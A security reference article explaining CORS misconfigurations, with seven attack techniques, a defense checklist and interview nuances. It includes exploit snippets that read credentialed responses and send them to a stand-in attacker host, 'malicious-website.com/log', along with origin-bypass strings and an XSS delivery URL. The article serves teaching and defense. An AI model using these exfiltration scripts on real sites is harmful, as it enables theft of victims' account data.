# CORS Misconfiguration

> The Same-Origin Policy (SOP) lets a page *send* cross-origin requests but blocks it from *reading* the responses. CORS is a server-driven, controlled relaxation of the read restriction: the server uses response headers (chiefly `Access-Control-Allow-Origin`) to name which origins are permitted to read its responses, and the browser enforces that grant. A CORS bug is therefore always the server relaxing too far, telling the browser that an attacker-controlled origin is allowed to read authenticated responses. Two consequences fall out of this and both are constantly confused: CORS controls reading, not sending, so a CORS misconfiguration is a data-theft primitive, not a request-forgery one; and CORS is a browser-enforced relaxation, so it is never a server-side protection, a non-browser client (curl, a proxy, the attacker's own server) ignores it entirely.

## How it works

SOP is the baseline: `https://a.com` may issue a request to `https://b.com`, but JavaScript on `a.com` cannot read the response unless `b.com` opts in via CORS. Two origins match only if scheme, host, and port are all identical.

The core header exchange. The browser adds an `Origin` header to the cross-origin request; the server answers with an allow header the browser checks:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
```

Because the returned origin matches the caller, the browser exposes the response body to `normal-website.com`'s script. If they did not match, the browser would block the read (the request may still have hit the server and had side effects, which is why CORS is not a CSRF defense).

**Credentials semantics (the rule most bugs violate).** Cross-origin requests omit cookies and the `Authorization` header by default. They are only included when the caller sets `credentials: 'include'` (or `withCredentials = true`) *and* the server returns `Access-Control-Allow-Credentials: true`. Critically, when credentials are in play the specification forbids the wildcard: `Access-Control-Allow-Origin` must be a single, explicit origin, never `*`. Servers that want to support many origins therefore tend to *reflect* the request's `Origin` back, and that reflection is the root of the classic critical bug.

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

The combination above is rejected by browsers precisely because it would expose authenticated content to everyone; the wildcard also cannot be used as a partial value like `https://*.example.com`.

**Simple requests versus preflight.** A "simple" request (GET/HEAD/POST, only CORS-safelisted headers, and a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`) goes straight out. Anything else (a custom header, `application/json`, or a method like PUT/DELETE) is preceded by a preflight `OPTIONS`:

```
OPTIONS /data HTTP/1.1
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom
```

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: X-Custom
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

Only if the preflight approves the method and headers does the browser send the real request. This is why requiring a custom header is a CSRF defense: the header forces a preflight the server can decline.

## Attack techniques

### 1. Reflected origin with credentials (the classic critical bug)

The server reads the request `Origin` and echoes it into ACAO while also sending `Allow-Credentials: true`:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

Every origin is trusted, including the attacker's. Exploit page:

```js
var req = new XMLHttpRequest();
req.onload = function () {
  location = '//malicious-website.com/log?key=' + this.responseText;
};
req.open('get', 'https://vulnerable-website.com/api/account', true);
req.withCredentials = true;
req.send();
```

Why it works: the victim's browser attaches their session cookie, the server approves the attacker origin, the browser hands the authenticated body to attacker JS, which exfiltrates it. This attack class was popularized by James Kettle of PortSwigger Research in "Exploiting CORS misconfigurations for Bitcoins and bounties" (2016).

### 2. Trusted null origin

Some servers allowlist the literal string `null` (often left over from local-development convenience). But `null` is attacker-reachable: browsers send `Origin: null` from sandboxed iframes, `data:` and `file:` URLs, and certain cross-origin redirects. A sandboxed iframe delivers a credentialed request with a `null` origin:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = function(){ location='https://malicious-website.com/log?key='+this.responseText; };
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

Allowlisting `null` is equivalent to allowlisting attackers, so `null` must never appear in an allowlist.

### 3. Weak origin validation (prefix, suffix, substring, unescaped regex)

Allowlists implemented with `startsWith`, `endsWith`, `includes`, or an unanchored regex are bypassable by registering or hosting an origin that satisfies the sloppy check:

- Suffix match on `normal-website.com` is beaten by `hackersnormal-website.com`.
- Prefix match on `normal-website.com` is beaten by `normal-website.com.evil-user.net`.
- An unescaped `.` in a regex (`^https://normal-website\.com$` written as `normal-website.com`) lets `normalXwebsite.com` match, where any attacker-registrable label satisfies the wildcard dot.
- Interior substring checks fall to `https://normal-website.com.evil.com` or `https://evil.com?normal-website.com`.

Detection: send crafted `Origin` variants (`Origin: https://normal-website.com.evil.com`, `Origin: https://evilnormal-website.com`) and watch whether the exact string is reflected in ACAO alongside `Allow-Credentials: true`.

### 4. Trust-all-subdomains plus subdomain compromise

A policy that trusts every `*.victim.com` origin inherits the weakest subdomain. If any subdomain has XSS, the attacker runs script there (a trusted origin) and makes the credentialed CORS read from it:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

Delivered by:

```
https://subdomain.vulnerable-website.com/?xss=<script>/* credentialed fetch + exfil */</script>
```

The same holds for a dangling DNS record: a **subdomain takeover** on `old-blog.victim.com` gives the attacker a legitimately trusted origin.

### 5. Breaking TLS through a plaintext-HTTP trusted subdomain

If a rigorously-HTTPS app also trusts a plain-HTTP subdomain origin (`http://trusted-subdomain.vulnerable-website.com`), a network attacker who can intercept any cleartext request can inject a redirect to that HTTP subdomain, spoof its response with a credentialed CORS request back to the HTTPS origin, and read the sensitive data. This works even when the target site has no HTTP endpoints and marks all cookies `Secure`, because the trust is anchored on the attacker-forgeable HTTP subdomain origin.

### 6. Intranet CORS without credentials

Most CORS attacks depend on `Allow-Credentials: true`. The exception is internal apps that reflexively return `Access-Control-Allow-Origin: *` without credentials but are only reachable inside a private network. An external attacker page loaded by an internal user's browser uses that browser as a proxy to read intranet responses the attacker could never reach directly:

```
GET /reader?url=doc1.pdf HTTP/1.1
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

### 7. Vary: Origin cache leak

When ACAO is computed from the request `Origin` but the response is served through a shared cache that does not key on `Origin`, one user's allowed-origin response can be cached and served to another origin, a cache-poisoning angle that turns a per-request grant into a cross-origin leak. Always emit `Vary: Origin` on origin-dependent responses.

## Defense

CORS bugs are configuration bugs, so the defense is disciplined configuration, ordered by effectiveness.

1. **Do not add CORS at all unless a cross-origin read is genuinely required.** SOP protects you by default; most CORS vulnerabilities exist only because sharing was enabled unnecessarily. Removing the headers is the strongest fix.

2. **Validate `Origin` against an exact, hardcoded allowlist, then echo only a matching origin.** Compare full scheme, host, and port for equality against a constant set. Never reflect an arbitrary `Origin`, and never build the check from `startsWith`/`endsWith`/`includes` or an unanchored, unescaped regex. If you must use a regex, anchor it (`^...$`) and escape the dots.

3. **Never combine broad ACAO with credentials.** An endpoint that returns `Access-Control-Allow-Credentials: true` must return a single, exact, validated origin, never `*` and never a reflected untrusted value. Prefer to avoid credentialed CORS entirely for sensitive data.

4. **Never allowlist `null`.** Remove it from any allowlist; it is reachable from sandboxed iframes, `data:`/`file:` URLs, and redirects, so it is effectively a wildcard for attackers.

5. **Do not blanket-trust subdomains, and treat subdomain takeover and subdomain XSS as first-class risks.** Segment trust, decommission dangling DNS, and keep every trusted subdomain to the same security bar as the main app, because CORS makes any one of them a read-gateway to the others.

6. **Emit `Vary: Origin`** on every response whose ACAO depends on the request origin, so shared caches cannot leak a grant across origins.

7. **Keep server-side authentication, authorization, and CSRF defenses independent of CORS.** CORS is browser-enforced and controls reading only; it authorizes nothing on the server. An attacker can forge a request from any "trusted" origin using a non-browser client, so sensitive data still needs server-side access control regardless of the CORS policy. Avoid CORS wildcards on internal networks, since internal browsers can reach untrusted external sites.

## Interview-grade nuances

- CORS relaxes SOP, it does not tighten it: a misconfiguration can only *increase* exposure, never reduce it, and a correctly locked-down CORS policy adds no server-side authorization.
- CORS does not protect against CSRF and is a common source of confusion: CSRF is a *send* attack (SOP allows the send), CORS governs the *read*. A permissive CORS policy actually worsens CSRF by re-enabling cross-origin credentialed requests plus response reads.
- The wildcard is genuinely fail-safe with credentials (browsers refuse `*` plus `Allow-Credentials: true`), which is exactly why servers switch to origin reflection and reintroduce the vulnerability.
- No browser supports multiple origins or a partial wildcard (`https://*.example.com`) in a single ACAO value: the server must choose one origin per response, which forces the reflect-or-allowlist decision.
- Impact hinges on three factors together: credentials sent, a reflected or weakly validated origin, and a sensitive response. Remove any one and the finding downgrades (an unauthenticated endpoint the attacker could already reach directly is not meaningfully exploitable via CORS).
- Preflight is a legacy-protection and integrity mechanism, not an authorization boundary: it gates *which* cross-origin requests proceed, but the server still owns authentication and authorization of whatever does get through.
- Even a perfectly configured CORS trust relationship is transitive: if you trust an origin that later develops XSS, that XSS can read your responses, so a CORS grant is only as strong as the security of every origin it names.

## Sources

- PortSwigger, CORS: https://portswigger.net/web-security/cors
- PortSwigger, CORS and the Access-Control-Allow-Origin response header: https://portswigger.net/web-security/cors/access-control-allow-origin
- PortSwigger Research, Exploiting CORS misconfigurations for Bitcoins and bounties (James Kettle): https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- MDN, Cross-Origin Resource Sharing (CORS): https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- OWASP, HTML5 Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
